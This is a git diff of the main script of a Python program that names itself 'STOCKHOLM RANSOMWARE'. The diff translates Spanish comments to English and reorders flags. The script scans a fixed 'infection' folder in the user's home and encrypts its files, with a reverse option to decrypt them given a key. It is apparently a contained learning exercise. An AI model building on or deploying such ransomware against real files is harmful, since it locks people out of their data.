@@ -4,34 +4,30 @@ from encryptor import encrypt_dirs
 from decryptor import decrypt_dirs
 from getpass import getuser
 
-# Variables del usuario
+# Target default directory
 user_target = getuser()
 user_dir = '/home/'+user_target
 default_dir = '/home/'+user_target+'/infection'
 
 # Main
 def run():
-    # Opciones de Flags
+    # Charge flags config
     args = config_args()
-    # Evaluacion de Flags
-    ## Infeccion de directorio
+    ## Encrypt directory - forced to default_dir
     if args.reverse == None and args.version == False:
-        # Escaneo de Directorio
         res_encrypt = scan_encrypt(dir=default_dir,silent=args.silent)
         if len(res_encrypt) > 0:
-            # Cifrado de Archivos
             encrypt_dirs(lst_dir=res_encrypt,silent=args.silent)
-    if args.version == True:
-        # Version del Programa
-        print("Program version Stockholm-1.1 - lgomes-o")
+    ## Decrypt directory - forced to default_dir
     if args.reverse != None and args.version == False:
-        # Escaneo de Directorio
         re_decrypt = scan_decrypt(dir=default_dir,silent=args.silent)
         if len(re_decrypt) > 0:
-            # Descifrado de Archivos 
             decrypt_dirs(key=args.reverse,lst_dir=re_decrypt,silent=args.silent)
+    ## Print version program
+    if args.version == True:
+        print("Program version Stockholm-1.1 - lgomes-o")
 
-# Configuracion de Flags
+# Flags configurations
 def config_args():
     parser = argparse.ArgumentParser(
         description= """*** STOCKHOLM RANSOMWARE ***\n
@@ -45,7 +41,7 @@ def config_args():
     # Silent mode
     parser.add_argument("-s","--silent",default=False,action='store_true',help="Silent mode, the program output is emitted.")
     # Version mode
-    parser.add_argument("-v","--version",default=False,action='store_true',help="Program version.")
+    parser.add_argument("-v","--version",default=False,action='store_true',help="Print program version.")
     return parser.parse_args()
 
 # Main execution
